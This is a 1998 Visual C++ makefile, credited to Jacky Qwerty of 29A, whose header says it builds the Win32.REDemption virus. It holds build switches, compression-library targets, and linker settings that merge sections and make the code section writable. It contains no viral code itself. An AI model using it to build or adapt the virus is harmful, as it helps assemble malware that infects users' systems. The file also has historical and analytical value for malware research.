   # WIN32RED.MAK - Builds Win32.REDemption virus.
   # Microsoft Visual C++ 6.0 makefile.
   # (c) 1998 by Jacky Qwerty/29A.

   INCPATH = #d:\combo98\proglang\vc6\include
   LIBPATH = #d:\combo98\proglang\vc6\lib

   PRJ = Win32Red
   SYSLIBS = kernel32.lib user32.lib
   !ifdef compr
   ENCODE = jqencode
   DECODE = jqdecode
   CODLIB = jqcoding.lib
   !endif

   !ifdef msgbox
   MSG = /Dmsgbox
   !endif

   !ifdef tsr
   TSR = /Dtsr
   !endif

   !ifdef icon
   RES = $(PRJ).res
   ICO = /Dicon
   !endif

   !ifdef compr
   CMP = /Dcompr
   AFLAGS = /nologo /coff $(DEFS)
   !endif

   CFLAGS = /nologo /G3r /W3 /Zlp1 /FAcs /I$(INCPATH) $(INC) $(MSG) $(TSR)\
            $(ICO) $(CMP) $(DEFS)
   LFLAGS = /nologo /subsystem:windows /pdb:none /machine:I386 /incremental:no\
            /fixed:no /nodefaultlib /map:$(PRJ).map /entry:$(PRJ)\
            /libpath:$(LIBPATH)

   !ifndef debug
   CFLAGS = $(CFLAGS) /O1ab2 /DNDEBUG /Drelease
   LFLAGS = $(LFLAGS) /merge:.idata=.data /merge:.data=.text
   PATCH = editbin /nologo /section:.text,iw $(PRJ).exe
   !else
   CFLAGS = $(CFLAGS) /MLd /Z7 /D_DEBUG
   LFLAGS = $(LFLAGS) /debug
   !endif

   $(PRJ).exe : $(PRJ).obj $(RES) $(CODLIB)
     link $(LFLAGS) $** $(SYSLIBS)
     $(PATCH)

   !ifdef compr
   $(CODLIB) : $(ENCODE).obj $(DECODE).obj
     @if exist $@ del $@
     lib /nologo /out:$@ $**
   !endif
